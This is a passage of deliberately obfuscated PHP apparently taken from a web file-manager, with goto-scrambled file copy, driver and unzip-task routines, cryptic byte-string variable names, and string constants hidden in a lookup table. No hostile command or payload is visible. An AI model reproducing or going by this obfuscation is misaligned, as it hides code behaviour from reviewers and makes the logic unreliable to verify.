$e’ğ¥ñìç…->{$a¿†ËÖœÛ}($AİÜÏíÆ, $cì¿ä¤ËÜĞ, $D‡¹­´Ğ¡Ì); } } goto A„ÒÜÒ¯ğÄ; EÆåİä¼è: $e…×‚‡Ìùœ = self::driverMake($AİÜÏíÆ); $e’ğ¥ñìç… = self::driverMake($cì¿ä¤ËÜĞ); $FÈ‘…¦‹Ù = $a¿†ËÖœÛ == $f«´ØŠ¾Í±[529]; goto eÈîïİ§¡; b¼— ¹Ó“®: $f«´ØŠ¾Í± =& $_SERVER[Ü˜]; if (!$AİÜÏíÆ || $AİÜÏíÆ == $f«´ØŠ¾Í±[8] || !$cì¿ä¤ËÜĞ) { return !1; } ignore_timeout(); goto EÆåİä¼è; eÈîïİ§¡: $C½ã–ÊŠ“ = !1; if ($e’ğ¥ñìç…->pathParse[$f«´ØŠ¾Í±[1049]]) { $cì¿ä¤ËÜĞ = $e’ğ¥ñìç…->pathParse[$f«´ØŠ¾Í±[1049]]; $C½ã–ÊŠ“ = $e’ğ¥ñìç…; $e’ğ¥ñìç… = self::driverMake($cì¿ä¤ËÜĞ); } self::check($e…×‚‡Ìùœ, $AİÜÏíÆ, $e’ğ¥ñìç…, $cì¿ä¤ËÜĞ); goto cƒØÃ¹ÚÈ“; c¥°‡˜êø¿: } private static function check($CóÅ‘Àô‚, $cÆÆê“ÊùÅ, $BË„Ù¯„ƒí, &$FÏÇòÃ¾çŞ) { $f¾ÕÜî·›¼ =& $_SERVER[Ü˜]; if (self::driverIsSame($CóÅ‘Àô‚, $BË„Ù¯„ƒí) && $CóÅ‘Àô‚->isFolder($cÆÆê“ÊùÅ) && $CóÅ‘Àô‚->isParentOf($cÆÆê“ÊùÅ, $FÏÇòÃ¾çŞ)) { show_json(LNG($f¾ÕÜî·›¼[1051]), !1); } if (!$CóÅ‘Àô‚->exist($cÆÆê“ÊùÅ)) { show_json(LNG($f¾ÕÜî·›¼[115]), !1); } } private static function copyPath($f®»è¸¤İ‘, $a¥ìõ”ã, $f¼ÂøİŞÙù, $e†–ì„¾‡Í, $eÖß¥‘ŠÍİ, $A„ŠçÑĞÅœ, $e‚ó‰İÓ´, $fáìÓ«Òì‘ = false) { goto DöµõÜÊ®¿; dèøÉˆÏ»‘: self::copyMoveKeepInfo($f®»è¸¤İ‘, $a¥ìõ”ã, $e¯ØÎ³Ëğ); return $e¯ØÎ³Ëğ; goto eºíğÈ„´ˆ; A°ÔÃïïòâ: if ($e‚ó‰İÓ´) { return self::copyFile($f®»è¸¤İ‘, $a¥ìõ”ã, $f¼ÂøİŞÙù, $e†–ì„¾‡Í, $dŸâ¹‡Ô± , $A„ŠçÑĞÅœ); } if ($eÖß¥‘ŠÍİ == REPEAT_RENAME_FOLDER) { $eÖß¥‘ŠÍİ = !1; } $a„„´Ú³¶Ú = rtrim($e†–ì„¾‡Í, $F‰‚Í‰ÒÓç[8]) . $F‰‚Í‰ÒÓç[8] . $dŸâ¹‡Ô± ; goto eø«ø£¯Ø˜; DöµõÜÊ®¿: $F‰‚Í‰ÒÓç =& $_SERVER[Ü˜]; $dŸâ¹‡Ô±  = empty($fáìÓ«Òì‘) && $fáìÓ«Òì‘ !== $F‰‚Í‰ÒÓç[201] ? $f®»è¸¤İ‘->pathThis($a¥ìõ”ã) : $fáìÓ«Òì‘; if ($eÖß¥‘ŠÍİ) { $DÄªŒ‹é½· = $f¼ÂøİŞÙù->fileNameExist($e†–ì„¾‡Í, $dŸâ¹‡Ô± ); $dŸâ¹‡Ô±  = $f¼ÂøİŞÙù->fileNameAuto($e†–ì„¾‡Í, $dŸâ¹‡Ô± , $eÖß¥‘ŠÍİ, !$e‚ó‰İÓ´); $eÖß¥‘ŠÍİ = $DÄªŒ‹é½· ? $eÖß¥‘ŠÍİ : !1; } goto A°ÔÃïïòâ; eø«ø£¯Ø˜: $e¯ØÎ³Ëğ = $f¼ÂøİŞÙù->mkdir($f¼ÂøİŞÙù->getPath($a„„´Ú³¶Ú)); $e†–ì„¾‡Í = $f¼ÂøİŞÙù->getPathInner($e¯ØÎ³Ëğ); $CÙƒ Ûöã = $f®»è¸¤İ‘->listPath($a¥ìõ”ã, !0); goto BíĞİÌ¹¶Ö; BíĞİÌ¹¶Ö: $CÙƒ Ûöã = is_array($CÙƒ Ûöã) ? $CÙƒ Ûöã : array($F‰‚Í‰ÒÓç[84] => array(), $F‰‚Í‰ÒÓç[85] => array()); $aÅË˜÷¬É¤ = array_merge($CÙƒ Ûöã[$F‰‚Í‰ÒÓç[84]], $CÙƒ Ûöã[$F‰‚Í‰ÒÓç[85]]); foreach ($aÅË˜÷¬É¤ as $FÉœôÃŒä) { $DêçØîƒ¬ù = $FÉœôÃŒä[$F‰‚Í‰ÒÓç[29]] == $F‰‚Í‰ÒÓç[203]; $a¥ìõ”ã = $f®»è¸¤İ‘->getPathInner($FÉœôÃŒä[$F‰‚Í‰ÒÓç[86]]); $D·¾î½ß = self::copyPath($f®»è¸¤İ‘, $a¥ìõ”ã, $f¼ÂøİŞÙù, $e†–ì„¾‡Í, $eÖß¥‘ŠÍİ, $A„ŠçÑĞÅœ, $DêçØîƒ¬ù); if (!$D·¾î½ß) { IO::errorTips($F‰‚Í‰ÒÓç[1052] . $a¥ìõ”ã . $F‰‚Í‰ÒÓç[77] . $e†–ì„¾‡Í); } } goto dèøÉˆÏ»‘; eºíğÈ„´ˆ: } private static function copyFile($DÕÄâ¼Ï˜‚, $E†‰ƒ×‹¨, $Fˆ›ºĞÆõá, $Fˆö—‡¸‰›, $C„‹‘¨‘á“, $bÕ±ÈÖºé†) { goto CÅÆÏ—¬ë³; CÅÆÏ—¬ë³: $bºÑ˜•‘Î =& $_SERVER[Ü˜]; $Fˆö—‡¸‰› = $Fˆ›ºĞÆõá->getPath(rtrim($Fˆö—‡¸‰›, $bºÑ˜•‘Î[8]) . $bºÑ˜•‘Î[8] . $C„‹‘¨‘á“); $a¬ËĞ‡§Î… = $bºÑ˜•‘Î[1053] . time() . rand_string(5); goto B‡óòÏé§Ì; B‡óòÏé§Ì: Hook::trigger($bºÑ˜•‘Î[1054], $DÕÄâ¼Ï˜‚, $E†‰ƒ×‹¨, $Fˆ›ºĞÆõá, $Fˆö—‡¸‰›, $C„‹‘¨‘á“, $a¬ËĞ‡§Î…); if (self::driverIsSame($DÕÄâ¼Ï˜‚, $Fˆ›ºĞÆõá)) { if ($bÕ±ÈÖºé†) { $a¥£Â•”£ù = $Fˆ›ºĞÆõá->moveFile($E†‰ƒ×‹¨, $Fˆö—‡¸‰›); } else { $a¥£Â•”£ù = $Fˆ›ºĞÆõá->copyFile($E†‰ƒ×‹¨, $Fˆö—‡¸‰›); } Hook::trigger($bºÑ˜•‘Î[1055], $DÕÄâ¼Ï˜‚, $E†‰ƒ×‹¨, $Fˆ›ºĞÆõá, $Fˆö—‡¸‰›, $C„‹‘¨‘á“, $a¥£Â•”£ù); self::copyMoveKeepInfo($DÕÄâ¼Ï˜‚, $E†‰ƒ×‹¨, $a¥£Â•”£ù); return $a¥£Â•”£ù; } $aãÊÏÑ¥Ñ‰ = TEMP_FILES; goto f‚››—î¿„; f‚››—î¿„: if ($GLOBALS[$bºÑ˜•‘Î[6]][$bºÑ˜•‘Î[98]][$bºÑ˜•‘Î[769]]) { $aãÊÏÑ¥Ñ‰ = $GLOBALS[$bºÑ˜•‘Î[6]][$bºÑ˜•‘Î[98]][$bºÑ˜•‘Î[769]]; } $bÕ±ÈÖºé† = !0; $E™ÒîÂ²¤· = $aãÊÏÑ¥Ñ‰; goto a½ƒå½İ‘Ã; a½ƒå½İ‘Ã: mk_dir($E™ÒîÂ²¤·); $d©Æ™…Šˆ = $E™ÒîÂ²¤· . $a¬ËĞ‡§Î…; $b™²ÄÊ‰‚„ = $d©Æ™…Šˆ; goto e¸¹”ùƒ½‹; eØ á•Ó¼ß: return $a¥£Â•”£ù; goto c‰ªÆî‹Ší; e¸¹”ùƒ½‹: $d©Æ™…Šˆ = $DÕÄâ¼Ï˜‚->download($E†‰ƒ×‹¨, $d©Æ™…Šˆ); $d©Æ™…Šˆ = $DÕÄâ¼Ï˜‚->iconvApp($d©Æ™…Šˆ); $a¥£Â•”£ù = $Fˆ›ºĞÆõá->upload($Fˆö—‡¸‰›, $d©Æ™…Šˆ, $bÕ±ÈÖºé†); goto a—ÒÅ†Ø ; a—ÒÅ†Ø : self::remove($b™²ÄÊ‰‚„); Hook::trigger($bºÑ˜•‘Î[1055], $DÕÄâ¼Ï˜‚, $E†‰ƒ×‹¨, $Fˆ›ºĞÆõá, $Fˆö—‡¸‰›, $C„‹‘¨‘á“, $a¥£Â•”£ù); self::copyMoveKeepInfo($DÕÄâ¼Ï˜‚, $E†‰ƒ×‹¨, $a¥£Â•”£ù); goto eØ á•Ó¼ß; c‰ªÆî‹Ší: } private static function copyMoveKeepInfo($FÈ±“ãòÒ, $B˜‡¥Í£öò, $cØ§™¢ÚÎÂ) { if (!$cØ§™¢ÚÎÂ) { return; } $Eğğ¶£˜äÅ = $FÈ±“ãòÒ->info($B˜‡¥Í£öò); if (!is_array($Eğğ¶£˜äÅ)) { return; } IO::setModifyTime($cØ§™¢ÚÎÂ, $Eğğ¶£˜äÅ[$_SERVER[Ü˜][94]]); } public static function pathFather($DÆéØĞš¤÷) { $e»ÃËå‡ì„ = IO::init($DÆéØĞš¤÷); $cÅ¼íÏ÷Ó = $e»ÃËå‡ì„->pathFather($e»ÃËå‡ì„->path); return $e»ÃËå‡ì„->getPathOuter($cÅ¼íÏ÷Ó); } public static function fileOut($E…™Áªñì½, $C¿óº„ê‘ = false, $c——¿¾áÌ = false, $E®„„«óŒ = '') { $AÂï¨ Ê°¢ = self::driverMake($E…™Áªñì½); if ($AÂï¨ Ê°¢->isFileOutServer()) { return $AÂï¨ Ê°¢->fileOutServer($E…™Áªñì½, $C¿óº„ê‘, $c——¿¾áÌ, $E®„„«óŒ); } return $AÂï¨ Ê°¢->fileOut($E…™Áªñì½, $C¿óº„ê‘, $c——¿¾áÌ, $E®„„«óŒ); } public static function fileOutImage($a—†™ù¹šó, $B‡œÙÑÂİ¸ = 250) { $bí×¯¥Ï = array(250, 600, 1200, 3000, 5000); for ($BÂÎÃ‘µ¢ = 0; $BÂÎÃ‘µ¢ < count($bí×¯¥Ï); $BÂÎÃ‘µ¢++) { if ($BÂÎÃ‘µ¢ == 0 && $B‡œÙÑÂİ¸ <= $bí×¯¥Ï[$BÂÎÃ‘µ¢]) { $B‡œÙÑÂİ¸ = $bí×¯¥Ï[$BÂÎÃ‘µ¢]; break; } else { if ($B‡œÙÑÂİ¸ > $bí×¯¥Ï[$BÂÎÃ‘µ¢ - 1] && $B‡œÙÑÂİ¸ <= $bí×¯¥Ï[$BÂÎÃ‘µ¢]) { $B‡œÙÑÂİ¸ = $bí×¯¥Ï[$BÂÎÃ‘µ¢]; break; } else { if ($BÂÎÃ‘µ¢ == count($bí×¯¥Ï) - 1 && $B‡œÙÑÂİ¸ > $bí×¯¥Ï[$BÂÎÃ‘µ¢]) { $B‡œÙÑÂİ¸ = $bí×¯¥Ï[$BÂÎÃ‘µ¢]; break; } } } } $Cº¨Û¢… ğ = self::driverMake($a—†™ù¹šó); if ($Cº¨Û¢… ğ->isFileOutServer()) { return $Cº¨Û¢… ğ->fileOutImageServer($a—†™ù¹šó, $B‡œÙÑÂİ¸); } return $Cº¨Û¢… ğ->fileOutImage($a—†™ù¹šó, $B‡œÙÑÂİ¸); } private static function driverIsSame($dÓ’µï˜Ø, $f²ôåÀ¢ö) { goto f¿—Û¨œ·©; d¯ÏŠÇÍˆ¨: if ($FÙËÕ°ˆ != $A­’˜õïœÍ) { return !1; } if ($FÙËÕ°ˆ == $AõÆÖ¼¹Õ·[727]) { return !0; } if ($FÙËÕ°ˆ == $AõÆÖ¼¹Õ·[116]) { return !0; } goto B°— §Ø¦—; B°— §Ø¦—: if ($dÓ’µï˜Ø->pathDriver == $f²ôåÀ¢ö->pathDriver) { return !0; } return !1; goto D§‡ùÏ¨­; f¿—Û¨œ·©: $AõÆÖ¼¹Õ· =& $_SERVER[Ü˜]; $FÙËÕ°ˆ = $dÓ’µï˜Ø->getType(); $A­’˜õïœÍ = $f²ôåÀ¢ö->getType(); goto d¯ÏŠÇÍˆ¨; D§‡ùÏ¨­: } public static function copyUpdate($bë™ßÃ„±á, $D½®ì®æ²„) { goto e¼Ğ²ïµàš; EíÍã¢Ï¿: Hook::trigger($ešÅç‚¨Ä´[1059], $bë™ßÃ„±á, $D½®ì®æ²„, $cÇ¨Ú·®™); foreach ($bÂÒ‰ÈŒ˜Ÿ as $b§ˆ¼÷õš) { IO::mkdir($b§ˆ¼÷õš); } foreach ($b¾óÌå®ç as $b§ˆ¼÷õš) { IO::copy($b§ˆ¼÷õš[$ešÅç‚¨Ä´[1056]], $b§ˆ¼÷õš[$ešÅç‚¨Ä´[1057]], REPEAT_REPLACE); } goto F„œ—©‹; E’¢Òİöõ„: $c÷¹Ó¡–Ã = self::_listAll($bë™ßÃ„±á); $eóÆ‰‰´ä÷ = self::_listAll($D½®ì®æ²„); $b¾óÌå®ç = array(); goto FÍÆ·ìƒÑ÷; FÍÆ·ìƒÑ÷: $bÂÒ‰ÈŒ˜Ÿ = array(); foreach ($c÷¹Ó¡–Ã as $cèäç¦×ùÀ => $b§ˆ¼÷õš) { if (isset($eóÆ‰‰´ä÷[$cèäç¦×ùÀ])) { if ($b§ˆ¼÷õš[$ešÅç‚¨Ä´[87]] == 1) { continue; } if ($eóÆ‰‰´ä÷[$cèäç¦×ùÀ][$ešÅç‚¨Ä´[88]] == $b§ˆ¼÷õš[$ešÅç‚¨Ä´[88]]) { continue; } } if ($b§ˆ¼÷õš[$ešÅç‚¨Ä´[87]] == 1) { $bÂÒ‰ÈŒ˜Ÿ[] = $D½®ì®æ²„ . $ešÅç‚¨Ä´[8] . $cèäç¦×ùÀ; continue; } $fù”¦£œƒâ = strstr(trim($cèäç¦×ùÀ, $ešÅç‚¨Ä´[8]), $ešÅç‚¨Ä´[8]) ? get_path_father($cèäç¦×ùÀ) : $ešÅç‚¨Ä´[33]; $b¾óÌå®ç[] = array($ešÅç‚¨Ä´[1056] => $b§ˆ¼÷õš[$ešÅç‚¨Ä´[86]], $ešÅç‚¨Ä´[1057] => rtrim($D½®ì®æ²„, $ešÅç‚¨Ä´[8]) . $ešÅç‚¨Ä´[8] . $fù”¦£œƒâ, $ešÅç‚¨Ä´[1058] => $b§ˆ¼÷õš); } $cÇ¨Ú·®™ = array($ešÅç‚¨Ä´[203] => $b¾óÌå®ç, $ešÅç‚¨Ä´[87] => $bÂÒ‰ÈŒ˜Ÿ); goto EíÍã¢Ï¿; e¼Ğ²ïµàš: $ešÅç‚¨Ä´ =& $_SERVER[Ü˜]; if (!IO::exist($bë™ßÃ„±á)) { return !1; } if (!IO::exist($D½®ì®æ²„)) { IO::mkdir($D½®ì®æ²„); } goto E’¢Òİöõ„; F„œ—©‹: } private static function _listAll($fØõˆèçÊ¦) { $E“çñÏÒÒˆ =& $_SERVER[Ü˜]; $fØõˆèçÊ¦ = KodIO::clear($fØõˆèçÊ¦); $CÇìŠ±îÈ— = IO::listAll($fØõˆèçÊ¦); foreach ($CÇìŠ±îÈ— as &$E“§«¾ÛÉ) { $aÛ¸îÂÓ¿ = substr($E“§«¾ÛÉ[$E“çñÏÒÒˆ[86]], strlen($fØõˆèçÊ¦)); $E“§«¾ÛÉ[$E“çñÏÒÒˆ[1060]] = trim($aÛ¸îÂÓ¿, $E“çñÏÒÒˆ[8]); } unset($E“§«¾ÛÉ); return array_to_keyvalue($CÇìŠ±îÈ—, $E“çñÏÒÒˆ[1060]); } public static function fileSubstr($c—±èïô•±, $fœÈßõ÷ö, $f„‡Õ¾œÍ¦ = false) { goto EµÅåÏŞ»à; Eçà“Š¶â: if ($f„‡Õ¾œÍ¦ <= 0) { return $cÎè¼éÛ¸«[33]; } if ($fœÈßõ÷ö < 0 || $fœÈßõ÷ö >= $E´ë÷Í›¨ª || $f„‡Õ¾œÍ¦ > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\145\122\145\141\144\40\145\162\x72\157\162\41\x20\163\164\141\x72\x74\75{$fœÈßõ÷ö}\x3b\154\x65\x6e\147\164\x68\x3d{$f„‡Õ¾œÍ¦}\73\40\163\x69\172\145\75{$E´ë÷Í›¨ª}\x3b"); } $EÉƒæÉ§¥ = $EòìÅ‡Ä¿ù->fileSubstr($c—±èïô•±, $fœÈßõ÷ö, $f„‡Õ¾œÍ¦); goto dÄ‡Ê¾Í; dÄ‡Ê¾Í: if (!$EÉƒæÉ§¥ && $f„‡Õ¾œÍ¦ && isset($GLOBALS[$cÎè¼éÛ¸«[1063]])) { throw new Exception($GLOBALS[$cÎè¼éÛ¸«[1063]][$cÎè¼éÛ¸«[1064]]); } return $EÉƒæÉ§¥; goto FŒ‰ÎÒö„¯; F®÷Ú—‘Šâ: $c‘Ó„¸Î = $fœÈßõ÷ö; $CïÒÀ®£°î = $f„‡Õ¾œÍ¦; if ($fœÈßõ÷ö < 0) { $fœÈßõ÷ö = $E´ë÷Í›¨ª + $fœÈßõ÷ö; } goto Aˆ¼­‘ê¸œ; Aˆ¼­‘ê¸œ: if ($f„‡Õ¾œÍ¦ === !1) { $f„‡Õ¾œÍ¦ = $E´ë÷Í›¨ª - $fœÈßõ÷ö; } if ($fœÈßõ÷ö + $f„‡Õ¾œÍ¦ > $E´ë÷Í›¨ª) { $f„‡Õ¾œÍ¦ = $E´ë÷Í›¨ª - $fœÈßõ÷ö; } if (!$E´ë÷Í›¨ª && $EòìÅ‡Ä¿ù->getType() == $cÎè¼éÛ¸«[116] && !$EòìÅ‡Ä¿ù->exist($c—±èïô•±)) { throw new Exception($cÎè¼éÛ¸«[1061] . LNG($cÎè¼éÛ¸«[1062]) . $cÎè¼éÛ¸«[925] . get_path_this($c—±èïô•±) . $cÎè¼éÛ¸«[33]); } goto Eçà“Š¶â; EµÅåÏŞ»à: $cÎè¼éÛ¸« =& $_SERVER[Ü˜]; $EòìÅ‡Ä¿ù = self::driverMake($c—±èïô•±); $E´ë÷Í›¨ª = $EòìÅ‡Ä¿ù->size($c—±èïô•±); goto F®÷Ú—‘Šâ; FŒ‰ÎÒö„¯: } private static function driverMake(&$e¤İ¬’ÒÎÃ) { goto A„ÃÎºîÇ„; AñØ§¬Ï…ç: if ($C²…—¦ó£î[$bŞ¹³ã²ß‘[29]] == KodIO::KOD_IO && !self::$driverListSystem[$C²…—¦ó£î[$bŞ¹³ã²ß‘[402]]]) { return !1; } $e¤İ¬’ÒÎÃ = $C²…—¦ó£î[$bŞ¹³ã²ß‘[1065]]; $eâæò…ÚÎ = self::driverGet($C²…—¦ó£î, $e¤İ¬’ÒÎÃ); goto Cîõ°°‹íë; Cîõ°°‹íë: return $eâæò…ÚÎ; goto BÅ…ˆæ¯®; A„ÃÎºîÇ„: $bŞ¹³ã²ß‘ =& $_SERVER[Ü˜]; $C²…—¦ó£î = KodIO::parse($e¤İ¬’ÒÎÃ); if (!self::$driverListSystem) { $AÇ‚ãèÂØ = Model($bŞ¹³ã²ß‘[736])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($AÇ‚ãèÂØ, $bŞ¹³ã²ß‘[402]); } goto AñØ§¬Ï…ç; BÅ…ˆæ¯®: } private static function driverGet($E³ªÆ—ÇÌ, &$dìÅÒØÎÚ…) { goto eå“ÀÂ¶Û›; Bäª›ùŠ¿È: $DõÒå™Âºµ->path = $dìÅÒØÎÚ…; return $DõÒå™Âºµ; goto b‹ŸœŞÓã; E¸•áâç´×: switch ($E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[29]]) { case KodIO::KOD_IO: $BÀ„ßª†¦â = self::$driverListSystem[$A¸˜óÉ±è]; break; case KodIO::KOD_SOURCE: $dìÅÒØÎÚ… = $A¸˜óÉ±è . $dìÅÒØÎÚ…; $BÀ„ßª†¦â = array($DÀŠÒœÚ‘[1067] => $DÀŠÒœÚ‘[1068], $DÀŠÒœÚ‘[6] => $E³ªÆ—ÇÌ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $DˆöÏïÇšØ = $GLOBALS[$DÀŠÒœÚ‘[1069]]; self::$driverListUser = array_to_keyvalue($DˆöÏïÇšØ, $DÀŠÒœÚ‘[402]); } $BÀ„ßª†¦â = self::$driverListUser[$A¸˜óÉ±è]; break; case KodIO::KOD_SHARE_LINK: $BÀ„ßª†¦â = array($DÀŠÒœÚ‘[1067] => $DÀŠÒœÚ‘[1070], $DÀŠÒœÚ‘[6] => $E³ªÆ—ÇÌ); $AÜ·Ö·£½ = Action($DÀŠÒœÚ‘[1071])->sharePathInfo($E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[86]]); $dìÅÒØÎÚ… = $AÜ·Ö·£½[$DÀŠÒœÚ‘[404]]; if (!$AÜ·Ö·£½[$DÀŠÒœÚ‘[404]]) { $f¬Ì’Å’Á„ = Model($DÀŠÒœÚ‘[572])->getInfo($AÜ·Ö·£½[$DÀŠÒœÚ‘[477]]); $dìÅÒØÎÚ… = KodIO::clear($f¬Ì’Å’Á„[$DÀŠÒœÚ‘[1072]] . $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1065]]); $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[475]] = $f¬Ì’Å’Á„; $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1049]] = $dìÅÒØÎÚ…; $BÀ„ßª†¦â = array($DÀŠÒœÚ‘[1067] => $DÀŠÒœÚ‘[1073], $DÀŠÒœÚ‘[6] => $E³ªÆ—ÇÌ); } break; case KodIO::KOD_SHARE_ITEM: $BÀ„ßª†¦â = array($DÀŠÒœÚ‘[1067] => $DÀŠÒœÚ‘[1074], $DÀŠÒœÚ‘[6] => $E³ªÆ—ÇÌ); $f¬Ì’Å’Á„ = Model($DÀŠÒœÚ‘[572])->getInfo($E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[402]]); if ($f¬Ì’Å’Á„[$DÀŠÒœÚ‘[404]] == $DÀŠÒœÚ‘[201]) { $dìÅÒØÎÚ… = KodIO::clear($f¬Ì’Å’Á„[$DÀŠÒœÚ‘[1072]] . $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1065]]); $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[475]] = $f¬Ì’Å’Á„; $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1049]] = $dìÅÒØÎÚ…; $BÀ„ßª†¦â = array($DÀŠÒœÚ‘[1067] => $DÀŠÒœÚ‘[1075], $DÀŠÒœÚ‘[6] => $E³ªÆ—ÇÌ); } else { if (!$dìÅÒØÎÚ…) { $dìÅÒØÎÚ… = $f¬Ì’Å’Á„[$DÀŠÒœÚ‘[404]]; } } break; default: $dìÅÒØÎÚ… = $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[86]]; $BÀ„ßª†¦â = array($DÀŠÒœÚ‘[1067] => $DÀŠÒœÚ‘[1076]); break; } $eËŒí¸í£« = $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[86]]; if (!isset(self::$driverCache[$eËŒí¸í£«])) { $fóó£Ò°Â = strtolower($BÀ„ßª†¦â[$DÀŠÒœÚ‘[104]]); $aÏĞ‚¤‘«Á = $GLOBALS[$DÀŠÒœÚ‘[6]][$DÀŠÒœÚ‘[98]][$DÀŠÒœÚ‘[800]]; $B’µÈ‹†Ëù = $DÀŠÒœÚ‘[82] . (isset($aÏĞ‚¤‘«Á[$fóó£Ò°Â]) ? $aÏĞ‚¤‘«Á[$fóó£Ò°Â] : ucfirst($fóó£Ò°Â)); if (!class_exists($B’µÈ‹†Ëù)) { show_json("{$B’µÈ‹†Ëù}\40\156\x6f\164\40\145\x78\x69\x73\164\x73\x21", !1); } $D­¥Âòâ’— = isset($BÀ„ßª†¦â[$DÀŠÒœÚ‘[6]]) ? $BÀ„ßª†¦â[$DÀŠÒœÚ‘[6]] : !1; self::$driverCache[$eËŒí¸í£«] = new $B’µÈ‹†Ëù($D­¥Âòâ’—); } goto FºÇô³‡; C°Ğ³›æ®: if (isset($BÀ„ßª†¦â[$DÀŠÒœÚ‘[6]][$DÀŠÒœÚ‘[1077]])) { $DõÒå™Âºµ->pathBase = rtrim($BÀ„ßª†¦â[$DÀŠÒœÚ‘[6]][$DÀŠÒœÚ‘[1077]], $DÀŠÒœÚ‘[8]) . $DÀŠÒœÚ‘[8]; $dìÅÒØÎÚ… = $DõÒå™Âºµ->pathBase . ltrim($dìÅÒØÎÚ…, $DÀŠÒœÚ‘[8]); } $dìÅÒØÎÚ… = $DõÒå™Âºµ->getPath($dìÅÒØÎÚ…); if (isset($E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1049]])) { $dìÅÒØÎÚ… = $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1049]]; } goto Bäª›ùŠ¿È; eå“ÀÂ¶Û›: $DÀŠÒœÚ‘ =& $_SERVER[Ü˜]; $Dõ¯òßô = $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[1066]]; $A¸˜óÉ±è = $E³ªÆ—ÇÌ[$DÀŠÒœÚ‘[402]]; goto E¸•áâç´×; FºÇô³‡: $DõÒå™Âºµ = self::$driverCache[$eËŒí¸í£«]; $DõÒå™Âºµ->pathDriver = $Dõ¯òßô; $DõÒå™Âºµ->pathBase = $DÀŠÒœÚ‘[33]; goto C°Ğ³›æ®; b‹ŸœŞÓã: } public static function errorTips($b‚ŠœØ¦¼ = false) { goto d­“È¬ÉÄ; D¾ï³–ËÀø: if ($b‚ŠœØ¦¼ === -1) { return $a˜­–¼­Ê ? $a˜­–¼­Ê[count($a˜­–¼­Ê) - 1] : $e°ë†‹ë§†[33]; } if ($b‚ŠœØ¦¼ === !1) { return implode($e°ë†‹ë§†[63], $a˜­–¼­Ê); } if (count($a˜­–¼­Ê) >= $F‡±Ã—Û¥™) { $a˜­–¼­Ê = array_slice($a˜­–¼­Ê, $F‡±Ã—Û¥™ * 0.5, $F‡±Ã—Û¥™); } goto e©ËÅ­Œ´Ç; d­“È¬ÉÄ: $e°ë†‹ë§† =& $_SERVER[Ü˜]; static $a˜­–¼­Ê = array(); $F‡±Ã—Û¥™ = 1000; goto D¾ï³–ËÀø; e©ËÅ­Œ´Ç: $a˜­–¼­Ê[] = $b‚ŠœØ¦¼; write_log($e°ë†‹ë§†[170] . ACTION . $e°ë†‹ë§†[1078] . $b‚ŠœØ¦¼, $e°ë†‹ë§†[1079]); goto dÃÆ¬ÔÆÊÎ; dÃÆ¬ÔÆÊÎ: } public static function getLastError($Cê…é´äÃ = '') { $AÅÆœÛ¶Ä¥ = self::errorTips(-1); return $AÅÆœÛ¶Ä¥ ? $AÅÆœÛ¶Ä¥ : $Cê…é´äÃ; } } goto E½²İ¼ôÄÍ; D©œ¢ƒÂ ¹: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto e¬àÃ¨¡; ešÖ›ëÁ: Hook::bind($B¥´®İÒĞ[1090], array($this, $B¥´®İÒĞ[1613])); $AÆö¢¯œ =& $this->task; $AÆö¢¯œ[$B¥´®İÒĞ[1614]] = $B¥´®İÒĞ[1095]; goto B×´ä‰¯’¾; B×´ä‰¯’¾: if (!$AÆö¢¯œ[$B¥´®İÒĞ[1435]]) { $AÆö¢¯œ[$B¥´®İÒĞ[1435]] = LNG($B¥´®İÒĞ[1615]); } goto D£ö™œë­; e¬àÃ¨¡: $B¥´®İÒĞ =& $_SERVER[Ü˜]; parent::startAfter(); Hook::bind($B¥´®İÒĞ[1611], array($this, $B¥´®İÒĞ[1612])); goto ešÖ›ëÁ; D£ö™œë­: } protected function endAfter() { $B¸™—Ñî— =& $_SERVER[Ü˜]; parent::endAfter(); Hook::unbind($B¸™—Ñî—[1611], array($this, $B¸™—Ñî—[1612])); Hook::unbind($B¸™—Ñî—[1090], array($this, $B¸™—Ñî—[1613])); } public function updateAfter() { $C´·¦°äÕÖ =& $_SERVER[Ü˜]; $AŠ¥ˆèŞœĞ =& $this->task; if (!$AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1022]] || !$AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[732]]) { return; } if ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1614]] == $C´·¦°äÕÖ[1095]) { $c‰×¹õ ø¬ = 0; if ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1573]]) { $c‰×¹õ ø¬ = $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1574]] / $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1573]]; } $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1530]] = $c‰×¹õ ø¬ * 0.3; } else { if ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1614]] == $C´·¦°äÕÖ[320]) { $c‰×¹õ ø¬ = $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1037]] / $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1022]]; $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1530]] = 0.3 + $c‰×¹õ ø¬ * 0.4; } else { if ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1614]] == $C´·¦°äÕÖ[117]) { $Bô¶ïÉºÌ‘ = 0; if ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1575]] == $C´·¦°äÕÖ[117]) { $Bô¶ïÉºÌ‘ = $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1574]]; } $c‰×¹õ ø¬ = ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1578]] + $Bô¶ïÉºÌ‘) / 